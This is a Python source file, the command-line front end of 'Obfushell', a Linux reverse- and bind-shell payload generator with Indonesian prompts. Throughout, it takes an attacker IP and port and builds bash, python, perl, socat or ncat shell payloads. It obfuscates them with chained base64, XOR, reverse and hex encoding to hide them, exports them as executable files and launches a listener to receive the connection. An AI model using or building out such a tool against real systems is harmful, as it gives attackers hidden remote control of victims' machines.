import argparse
import sys
import subprocess
from core.generator import generate_payload
from core.obfuscator import chain_encode, decode_hint
from core.listener import start_listener
from core.helpers import is_valid_ip, recommend_port

def export_payload(payload, payload_type, filename):
    """Export payload to executable."""
    try:
        if payload_type.startswith("bash"):
            with open(filename, "w") as f:
                f.write("#!/bin/bash\n")
                f.write(payload)
        elif payload_type.startswith("python"):
            with open(filename, "w") as f:
                f.write("#!/usr/bin/env python3\n")
                f.write(payload.replace("python3 -c '", "").rstrip("'"))
        else:
            with open(filename, "w") as f:
                f.write(payload)
        subprocess.call(["chmod", "+x", filename])
        print(f"[+] Payload exported to {filename}")
    except Exception as e:
        print(f"[!] Error exporting payload: {str(e)}")

def interactive_mode():
    print("[Obfushell] Payload Generator - Interactive Mode\n")
    
    payload_type = input("Pilih jenis payload (bash_reverse, python_reverse, perl_reverse, socat_reverse, socat_bind, ncat_reverse, ncat_bind): ").strip()
    while payload_type not in ["bash_reverse", "python_reverse", "perl_reverse", "socat_reverse", "socat_bind", "ncat_reverse", "ncat_bind"]:
        print("[!] Invalid payload type.")
        payload_type = input("Pilih jenis payload: ").strip()
    
    lhost = input("Masukkan IP Attacker (LHOST): ").strip()
    while not is_valid_ip(lhost):
        print("[!] Invalid IP address.")
        lhost = input("Masukkan IP Attacker (LHOST): ").strip()
    
    scan = input("Scan port untuk rekomendasi LPORT? (y/n): ").strip().lower()
    if scan == "y":
        lport = recommend_port(lhost)
        if lport is None:
            lport = input("Masukkan Port (LPORT): ").strip()
    else:
        lport = input("Masukkan Port (LPORT): ").strip()
    while not lport.isdigit() or not 1 <= int(lport) <= 65535:
        print("[!] Invalid port.")
        lport = input("Masukkan Port (LPORT): ").strip()

    try:
        payload = generate_payload(payload_type, lhost, int(lport))
        print(f"[+] Raw Payload:\n{payload}")
    except ValueError as e:
        print(e)
        return

    obfuscation_method = input("Pilih metode obfuscation (base64, xor, reverse, hex, chain): ").strip()
    if obfuscation_method == "chain":
        methods = input("Masukkan metode chaining (base64, xor, reverse, hex) dipisah dengan koma: ").split(",")
        methods = [m.strip() for m in methods]
    else:
        methods = [obfuscation_method]
    
    try:
        obfuscated_payload, applied_methods, keys = chain_encode(payload, methods)
        hint = decode_hint(applied_methods, keys)
        print(f"[+] Obfuscated Payload:\n{obfuscated_payload}")
        print(f"[+] {hint}")
    except ValueError as e:
        print(e)
        return

    export = input("Export payload ke file? (y/n): ").strip().lower()
    if export == "y":
        filename = input("Masukkan nama file (contoh: payload.sh): ").strip()
        export_payload(obfuscated_payload, payload_type, filename)

    listen = input("Ingin langsung memulai listener (y/n): ").strip().lower()
    if listen == "y":
        listener_tool = input("Pilih listener tool (nc/socat/threaded): ").strip()
        start_listener(listener_tool, int(lport))

def quick_mode():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--type", required=True, help="Payload type")
    parser.add_argument("-l", "--lhost", required=True, help="LHOST")
    parser.add_argument("-p", "--lport", required=True, type=int, help="LPORT")
    parser.add_argument("-o", "--obfuscate", help="Obfuscation method")
    parser.add_argument("--export", help="Export payload to file")
    parser.add_argument("--listen", action="store_true", help="Start listener")
    args = parser.parse_args()

    if not is_valid_ip(args.lhost):
        print("[!] Invalid LHOST.")
        sys.exit(1)
    if not 1 <= args.lport <= 65535:
        print("[!] Invalid LPORT.")
        sys.exit(1)

    try:
        payload = generate_payload(args.type, args.lhost, args.lport)
        print(f"[+] Raw Payload:\n{payload}")
    except ValueError as e:
        print(e)
        sys.exit(1)

    if args.obfuscate:
        try:
            obfuscated_payload, applied_methods, keys = chain_encode(payload, [args.obfuscate])
            hint = decode_hint(applied_methods, keys)
            print(f"[+] Obfuscated Payload:\n{obfuscated_payload}")
            print(f"[+] {hint}")
        except ValueError as e:
            print(e)
            sys.exit(1)
    else:
        obfuscated_payload = payload

    if args.export:
        export_payload(obfuscated_payload, args.type, args.export)

    if args.listen:
        listener_tool = input("Pilih listener tool (nc/socat/threaded): ").strip()
        start_listener(listener_tool, args.lport)

def main():
    print("[Obfushell] Linux Payload Crafter\n")
    print("1. Interactive Mode")
    print("2. Quick Mode")
    print("3. Exit\n")

    choice = input("Pilih opsi (1/2/3): ").strip()
    if choice == "1":
        interactive_mode()
    elif choice == "2":
        quick_mode()
    else:
        sys.exit("[!] Exiting...")
